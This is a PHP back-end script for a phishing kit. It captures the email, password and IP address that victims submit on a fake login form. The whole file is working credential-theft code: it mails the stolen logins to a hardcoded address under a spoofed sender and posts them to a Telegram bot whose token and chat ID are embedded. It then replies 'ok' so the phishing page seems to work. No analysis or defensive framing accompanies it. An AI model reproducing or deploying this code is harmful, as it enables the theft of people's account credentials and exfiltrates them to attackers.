<?php
$ip = getenv("REMOTE_ADDR");
$login = $_POST['email'];
$passwd= $_POST['password'];

$done = array('signal'=>'ok');
$bad = array('signal'=>'bad');


if (!empty($login) && !empty($passwd)) {


    $own = 'info@jhflooringinc.com';
    $date = date("D/M/d, Y g:i a");
    $subj = "NEW: $login";
    $from = "From:Dav! <mail@me.mom163.com>";
    $msg = "Username: $login\nPassword: $passwd\nSubmitted on $date\n\Ip ===> $ip\n-----------------------------------\n        Created By (DAV)\n-----------------------------------";
    mail($own,$subj,$msg,$from);

    ///////////////////////////////////////////////////////////////////////

    $botToken2 = '5950332174:AAHloTCxl52WXAxLPSf-_IjxxBRuoRXRhQE'; // Replace with your bot token
    $chatId2 = '1813671610';

    // Telegram API URL
    $apiUrl2 = "https://api.telegram.org/bot{$botToken2}/sendMessage";

    // Prepare the message data
    $data2 = array(
        'chat_id' => $chatId2,
        'text' => $msg
    );

    // Use cURL to send the message
    $ch2 = curl_init($apiUrl2);
    curl_setopt($ch2, CURLOPT_POST, 1);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, $data2);
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);

    // Execute the cURL request
    $response2 = curl_exec($ch2);
    curl_close($ch2);

    echo json_encode($done);

    }

else {
  echo json_encode($bad);
}
$fp = fopen("","a");
fputs($fp,$msg);
fclose($fp);

?>
